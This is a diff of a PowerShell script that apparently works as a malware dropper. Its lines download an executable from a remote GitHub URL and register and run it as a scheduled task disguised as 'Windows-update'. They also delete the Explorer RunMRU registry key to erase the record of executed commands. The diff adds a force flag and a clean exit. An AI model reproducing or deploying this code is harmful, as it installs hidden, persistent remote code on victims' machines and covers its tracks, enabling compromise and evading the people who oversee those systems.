@@ -5,7 +5,7 @@ $client.DownloadFile($url,$file)
 #$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
 #$file = 'SystemTask.exe'
 #$client.DownloadFile($url,$file)
-$command = 'schtasks.exe /delete /tn Windows-update'
+$command = 'schtasks.exe /delete /tn Windows-update /f'
 iex $command
 $command = 'schtasks.exe /create /tn Windows-update /xml SystemTask.xml'
 iex $command
@@ -13,3 +13,4 @@ $command = 'schtasks.exe /run /tn Windows-update'
 iex $command
 $command = 'Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse'
 iex $command
+exit 0
